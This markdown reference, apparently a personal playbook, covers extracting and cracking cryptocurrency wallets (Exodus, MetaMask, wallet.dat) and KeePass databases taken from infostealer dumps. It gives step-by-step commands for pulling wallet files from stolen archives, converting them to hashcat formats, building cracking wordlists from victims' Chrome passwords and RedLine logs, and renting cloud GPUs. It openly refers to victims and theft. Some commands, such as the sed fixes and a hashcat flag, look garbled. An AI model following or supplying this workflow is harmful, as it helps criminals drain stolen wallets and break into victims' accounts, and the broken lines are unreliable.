# Infostealer Wallet Extraction Reference

## Remote Archive Extraction Over Tailscale

```bash
# 1. Find the target machine
tailscale status | grep -i <name>

# 2. Check archive contents remotely
ssh user@100.x.x.x "unzip -l archive.zip | grep -iE 'wallet|mnemonic|exodus|metamask|kdbx|\.seco|seed'"

# 3. Extract wallet files remotely
ssh user@100.x.x.x "unzip -o archive.zip '*/Exodus/*' '*/MetaMask/*' '*/wallet.dat' '*/PASS.kdbx' '*/mnemonic*' '*/Chrome*Password*' -d /tmp/extract/"

# 4. Rsync only the useful subset (not the full multi-GB archive)
rsync -avz user@100.x.x.x:/tmp/extract/ ./local_target/

# 5. Clean up remote temp (optional but good practice)
ssh user@100.x.x.x "rm -rf /tmp/extract/"
```

## Exodus SECO Format

**Magic bytes**: `53 45 43 4F` = "SECO"
**Version string**: `seco-v0-scrypt-aes`
**App**: `Exodus` + version (e.g. `22.5.21`)
**Cipher**: `aes-256-gcm`

Files are 32,284 bytes padded — the actual encrypted payload is much smaller.

### Exodus seed.seco Parsing (hex offsets)

```
0000-0003: "SECO" magic
0004-0015: padding zeros + length prefix
0016-0033: "seco-v0-scrypt-aes\0"
0034-0041: "Exodus\0" + version
0042-00DF: padding zeros (scrypt params area, may be sparse)
00E0-013F: IV/nonce (AES-GCM 12-byte nonce + padding)
0140-01FF: encrypted data begins
```

### Cracking with exodus2hashcat

```bash
# btcrecover exodus2hashcat.py is available in the tools/ directory
# Convert SECO file to hashcat format
python3 exodus2hashcat.py seed.seco

# Output format: EXODUS:<N>:<r>:<p>:<salt_b64>:<blob_key_iv_b64>:<blob_key_key_b64>:<blob_key_auth_tag_b64>
# Example: EXODUS:16384:8:1:ws7XsLLbbRW2pj2c1c9ZuJODJTeM2j90G5yLn38G6VQ=:OWm3g3EzExMzMmys:...

# Save hash to file
python3 exodus2hashcat.py seed.seco > exodus_hash.txt

# Crack (mode 28200 = Exodus Desktop Wallet scrypt)
# Install CPU OpenCL runtime if no GPU available:
sudo apt-get install -y pocl-opencl-icd ocl-icd-libopencl1

hashcat -m 28200 -a 0 -D 1 exodus_hash.txt wordlist.txt

# With rules
hashcat -m 28200 -a 0 -D 1 --rules=best64 exodus_hash.txt wordlist.txt

# CPU speed: ~40 H/s for N=16384,r=8,p=1 — too slow for 5M+ wordlists
# Use GPU via RunPod/cloud for production cracking

## MetaMask LevelDB Vault Extraction

MetaMask extension ID: `nkbihfbeogaeaoehlefnkodbefgpgknn`

### Reading LevelDB

When the LevelDB directory is corrupted (common in infostealer dumps — 
the Chrome extension was in use during theft), plyvel/leveldb-py may fail.
Use raw strings extraction as fallback:

```bash
# Quick check: search for "vault" key in raw LevelDB files
strings *.ldb *.log | grep -B2 -A20 '"data"' | head -60

# The encrypted vault JSON has structure:
# {"data":"<encrypted>","iv":"<base64>","salt":"<base64>"}
# and can span multiple lines after "vault" key
strings *.ldb *.log | grep -A5 '"vault"' | head -10

# Also check for wallet addresses directly in LevelDB strings
strings *.ldb *.log | grep -E '^0x[a-fA-F0-9]{40}$' | sort -u
```

### Option 1: plyvel (Python)
python3 -c "
import plyvel
db = plyvel.DB('/path/to/LevelDB/', create_if_missing=False)
for key, value in db:
    if b'vault' in key:
        print(value.decode())
"

# Option 2: strings on raw files (works on corrupted DBs)
strings *.ldb *.log | grep -A10 '"data"' | head -30

# Option 3: ldb dump tool
pip install leveldb-py
python3 -c "
import leveldb
db = leveldb.LevelDB('/path/to/LevelDB/')
for k, v in db.RangeIter():
    if b'vault' in k:
        print(v)
"
```

### Hashcat Mode 26600 (MetaMask)

```bash
# Convert vault JSON to hashcat format manually
python3 -c "
import json, base64
with open('vault.json') as f:
    v = json.load(f)
payload = v['data']
iv = base64.b64decode(v['iv'])
salt = base64.b64decode(v['salt'])
# Hashcat format:
# $metamask$*<salt_hex>*<iv_hex>*<ciphertext_hex>
print(f'\$metamask\$*{salt.hex()}*{iv.hex()}*{payload}')
" > metamask_hash.txt

hashcat -m 26600 -a 0 metamask_hash.txt wordlist.txt
```

## wallet.dat Analysis

### Check encryption status

Quick key presence check (works on any Bitcoin-derived wallet.dat):
```bash
# Look for "key!" entries — each one is a stored key entry
strings wallet.dat | grep 'key!'
# Multiple "key!" entries = wallet has keys (possibly encrypted)
# "mkey" or "encrypted" = master key encryption active
strings wallet.dat | grep -E 'encrypted|mkey|crypted_key'
# Unencrypted: keys may be directly extractable
```

### Hex header check

### Extract keys from unencrypted wallet
```bash
# Use pywallet
pip install pywallet
python3 -c "
from pywallet import wallet
w = wallet.restore_wallet('wallet.dat')
for addr, key in w.get_private_keys():
    print(f'{addr}: {key}')
"

# Or bitcoin-wallet CLI (bitcoind)
bitcoin-wallet -wallet=wallet.dat dump > keys.txt
```

## KeePass DB Cracking

### Format check
```bash
xxd PASS.kdbx | head -1
# Should start with: 03 D9 A2 9A (KeePass 2.x)
# If starts with: 9A A2 D9 03 (KeePass 1.x, use mode 13500)
```

### Hash extraction
```bash
# Method 1: keepass2john (John the Ripper)
keepass2john PASS.kdbx > kdbx_hash.txt

# Method 2: Hashcat native
hashcat —keepass2john PASS.kdbx

# Crack
hashcat -m 13400 -a 0 kdbx_hash.txt wordlist.txt
```

### PDF master password extraction
```bash
# Text PDF
pdftotext keepass_master.pdf - | head -20

# Scanned/image PDF — convert to image then OCR
pdftoppm keepass_master.pdf /tmp/km -png
tesseract /tmp/km-1.png stdout 2>/dev/null

# The master password may be handwritten or typed in the image
```

## Password List Curation from Mixed Sources

When dealing with infostealer dumps, combine password sources strategically:

```bash
# Source 1: Victim's Chrome passwords
awk -F',' '{print $NF}' "Chrome Passwords.csv" | sort -u > chrome_passwords.txt

# Source 2: RedLine log Passwords.txt files (different victims — still valuable)
find redline_logs/ -name 'Passwords.txt' -exec cat {} \; | sort -u > redline_passwords.txt

# Source 3: Pattern mutations from known passwords
python3 << 'EOF'
# Expand known passwords into common variants
patterns = ['Fanta', 'Network', 'Shahi', 'Imahacker', 'Professor', 
            'Damian', 'My3mokos', 'Whiteninja', 'Redcliffe']
years = ['2020', '2021', '2022', '2023', '2024']
specials = ['', '@', '!', '#', '$']
nums = ['1', '12', '33', '34', '66', '67', '99', '999', '199']
for p in patterns:
    print(p); print(p.lower())
    for y in years:
        print(f'{p}{y}'); print(f'{p.lower()}{y}')
        for s in specials:
            print(f'{p}{s}{y}'); print(f'{p.lower()}{s}{y}')
    for n in nums:
        print(f'{p}{n}'); print(f'{p.lower()}{n}')
EOF > pattern_mutations.txt

# Combine all sources
cat chrome_passwords.txt redline_passwords.txt pattern_mutations.txt \
    rockyou-top50k.txt PwnedPasswordsTop100k.txt > combined_crack.txt
```

## Hashcat Device Selection (Multi-Platform)

When multiple OpenCL platforms are present (e.g. Rusticl + PoCL), hashcat
may default to the GPU which can be 10x slower for scrypt. Force the CPU:

```bash
# List available devices
hashcat -I

# Output shows multiple platforms:
#   Platform #1 (Rusticl/Mesa) = AMD GPU → slow for scrypt
#   Platform #2 (PoCL) = CPU → ~40 H/s

# Force device by platform number:
hashcat -m 28200 -a 0 -D 1 exodus_hash.txt wordlist.txt   # Platform #1
hashcat -m 28200 -a 0 -D 2 exodus_hash.txt wordlist.txt   # Platform #2

# Platform #1 devices are also referenced as -d 1, -d 2 etc.
# When -d 2 says "No devices found/left", the device index may 
# be across ALL platforms, not per-platform. Use -D to select platform.
```

## Exodus exodus2hashcat.py Placeholder Fix

The `exodus2hashcat.py` script from btcrecover may have uninitialized
constants marked with `***`. These must be set to 16 (AES-GCM auth tag):

```bash
# Before running, check for and fix placeholders:
grep 'SIZE=\*\*\*' exodus2hashcat.py
# If found, set both to 16:
sed -i 's/METADATA_BLOB_KEY_AUTH_TAG_SIZE=16/MET...SIZE = 16/' exodus2hashcat.py
sed -i 's/METADATA_BLOB_AUTH_TAG_SIZE=16/MET...SIZE = 16/' exodus2hashcat.py
```

The corrected script outputs hashcat format:
`EXODUS:16384:8:1:<salt_b64>:<blob_key_iv_b64>:<blob_key_key_b64>:<blob_key_auth_tag_b64>`

## GPU on Linux for Hashcat — Practical Lessons

### AMD RX 580 (gfx803/Polaris)

| Method | Package | Speed | Works? |
|--------|---------|-------|--------|
| Rusticl | `mesa-opencl-icd` | ~3 H/s | Yes, but terrible for scrypt |
| ROCm | `rocm-opencl` | ~100K+ H/s | Often broken — comgr dependency not linked |
| PoCL (CPU) | `pocl-opencl-icd` | ~40 H/s | Always works, reliable |

**Rusticl (Mesa) OpenCL:** Installs cleanly, GPU is detected, but scrypt
performance is abysmal (~3 H/s vs ~40 H/s CPU). The driver overhead for
memory-hard functions makes it worse than no GPU at all.

```bash
# Installs but don't use for scrypt:
sudo apt-get install mesa-opencl-icd
# GPU shows as: Radeon RX 580 Series (radeonsi, polaris10, ACO, DRM ...)
# Speed: ~3 H/s for mode 28200 — worse than CPU
```

**ROCm OpenCL:** Can achieve full GPU speed but is fragile.

```bash
# Install from ROCm 6.4 repo:
wget 'https://repo.radeon.com/rocm/apt/6.4/pool/main/r/rocm-opencl/rocm-opencl_2.0.0.60400-47~24.04_amd64.deb'
sudo dpkg -i rocm-opencl.deb
sudo apt-get install -f

# After install, the ICD file may have bare library name:
cat /etc/OpenCL/vendors/amdocl64.icd  
# Should be full path: /opt/rocm-6.4.0/lib/libamdocl64.so

# Common failure: libamd_comgr.so.3 not found
# The comgr library may be in a different ROCm version path:
# /opt/rocm-7.2.2/lib/libamd_comgr.so.3.0.0
# Fix: create symlink from rocm-6.4.0/lib/ to the actual comgr

# If clinfo only shows PoCL, check the ICD is loadable:
ldd /opt/rocm-6.4.0/lib/libamdocl64.so | grep 'not found'
# Missing comgr = ROCm OpenCL won't register
```

### Recommendation

For wallet cracking (scrypt-heavy), **skip local GPU setup** and use RunPod
or another cloud GPU service. The setup time for AMD ROCm on Linux is not
worth the savings vs 10 minutes on a rented RTX 4090.

## KeePass DB Master Password from PDF Emergency Sheet

KeePass emergency sheets are PDFs generated by KeePass itself. They contain
a field for the master password that is typically BLANK (meant to be
handwritten after printing). Check before assuming the password is there:

```bash
# Extract text from the PDF:
pdftotext keepass_master.pdf - | grep -i 'master password'

# If the field name appears with no value after it, the sheet was never
# filled in. The password must be brute-forced.
# If it's a scanned image, use OCR:
pdftoppm keepass_master.pdf /tmp/km -png
tesseract /tmp/km-1.png stdout
```

The PDF metadata often reveals:
- Creator: "Microsoft: Print To PDF" (printed from HTML)
- Source: `file:///C:/Users/<user>/AppData/Local/Temp/Temp_<random>.html`
- Author: Windows username (helps identify the victim)
- Date: When the sheet was created/printed

## Mnemonic Non-BIP39 Handling

When a phrase fails BIP39 validation:

1. **Brain wallet**: SHA256(phrase) → private key
2. **Raw WIF**: Check if phrase IS the private key
3. **Hex key**: Hex decode → raw bytes → private key
4. **Partial BIP39**: Check against non-English BIP39 wordlists
5. **Custom wordlist**: May use market-specific wordlist (Cypher, Dark Matter)
6. **Multi-word passphrase**: Concatenate with/without spaces → SHA256
